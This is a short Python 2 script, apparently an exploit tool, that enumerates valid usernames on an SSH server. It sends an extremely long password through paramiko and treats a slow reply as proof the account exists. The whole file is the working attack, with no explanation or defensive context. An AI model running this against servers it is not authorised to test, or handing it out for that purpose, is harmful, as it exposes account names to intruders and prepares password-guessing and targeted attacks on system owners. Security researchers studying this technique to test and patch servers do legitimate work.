#!/usr/bin/env python2

import time
import argparse
import paramiko


def probe_user(username, hostname, port=22, threshold=6):
    ssh = paramiko.Transport((hostname, port))
    ssh.connect(username=username)
    start = time.time()
    try:
        ssh.auth_password(username, "A"*0x8000)
    except paramiko.AuthenticationException:
        pass
    ssh.close()
    return time.time() - start


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", dest="username", action="append",
                        required=True)
    parser.add_argument("-p", "--port", type=int, default=22, dest="port")
    parser.add_argument("-t", "--threshold", type=int, default=6,
                        dest="threshold")
    parser.add_argument("hostname")
    return parser.parse_args()


def main():
    args = parse_args()
    for username in args.username:
        timing = probe_user(username, args.hostname, args.port, args.threshold)
        exists = timing >= args.threshold
        print username + (" not ", " ")[exists] + "found"


if __name__ == "__main__":
    main()
